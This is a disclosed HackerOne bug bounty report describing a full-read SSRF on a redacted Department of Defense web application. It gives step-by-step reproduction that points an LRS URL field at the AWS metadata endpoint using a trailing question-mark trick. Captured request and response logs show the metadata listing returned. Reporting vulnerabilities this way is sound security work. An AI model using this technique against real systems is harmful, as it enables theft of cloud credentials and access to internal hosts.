# Full read SSRF at █████████ [HtUS]

## Report Details
- **Report ID**: 1628102
- **URL**: https://hackerone.com/reports/1628102
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-07-06T14:16:13.838Z
- **Disclosed**: 2022-09-14T20:52:39.213Z

## Reporter
- **Username**: sudi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Heyy there,
We have found a full read ssrf vuln in https://█████ , we were able to hit the AWS Metadata endpoint (http://███████) though the SSRF Vuln.


------------

**Steps to reproduce:**

1.Goto https://██████/users/create and create an account
2.After you account is verified , get login
If for some reasons you are not the verification code, try with a gmail id

3.Now visit: https://████/products/create/   and fill the required details
4.Once your product is created, click on `New Configuration` which is under *LRS Configurations*

████████

5.Enter this as the input for * LRS URL *: `http://█████████/latest/meta-data?` (the question mark at the end is important)
6.Under *Basic Auth User & Pass* enter test for both fields and click on `Create new LRS configuration` 

█████

7.Once the `Configuration` is created click on the `Test` button beside the conifguration name
████
8.Now you will be redirected to the homepage, so go back to the product page
9.Under `Past Results` you should be able to see a new entry
10.Click on `Manage Test record` > `Download log`
11.Now check the `Include HTTP` checkbox and from the `Log Format` drop down menu choose *Plain text*

A file with the name `log` should be downloaded in your computer, just open it and there you will find the response from the aws meta data endpoint:

```

""
failed
"SyntaxError: Unexpected token a in JSON at position 0"
REQUEST SUPERREQUEST
_______________________________________
POST /latest/meta-data?/statements HTTP/1.1
X-Experience-API-Version: 1.0.3
Authorization: Basic dGVzdDp0ZXN0
host: ██████████
accept: application/json
content-type: application/json
content-length: 324
Connection: close

{"actor":{"objectType":"Agent","name":"xAPI mbox","mbox":"mailto:████"},"verb":{"id":"http://███","display":{"en-GB":"attended","en-US":"attended"}},"object":{"objectType":"Activity","id":"http://www.example.com/meetings/occurances/34534"},"id":"3b9e4565-07ac-475f-be1f-d5f590f40779"}

RESPONSE SUPERREQUEST
_______________________________________
HTTP/1.0 200 OK
accept-ranges: bytes
content-length: 326
content-type: text/plain
date: Wed, 06 Jul 2022 13:48:12 GMT
last-modified: Thu, 30 Jun 2022 09:37:12 GMT
connection: close
server: EC2ws

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
=======================================
REQUEST SUPERREQUEST
_______________________________________
GET /latest/meta-data?/statements?statementId=3b9e4565-07ac-475f-be1f-d5f590f40779 HTTP/1.1
X-Experience-API-Version: 1.0.3
Authorization: Basic dGVzdDp0ZXN0
host: ██████
Connection: close

RESPONSE SUPERREQUEST
_______________________________________
HTTP/1.0 200 OK
accept-ranges: bytes
content-length: 326
content-type: text/plain
date: Wed, 06 Jul 2022 13:48:12 GMT
last-modified: Thu, 30 Jun 2022 09:37:12 GMT
connection: close
server: EC2ws

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
=======================================

```

## Impact

An attacker can dump aws keys  , reach internal hosts and etc


Thankyou
Regards
heint and sudi

## Attachments
No attachments
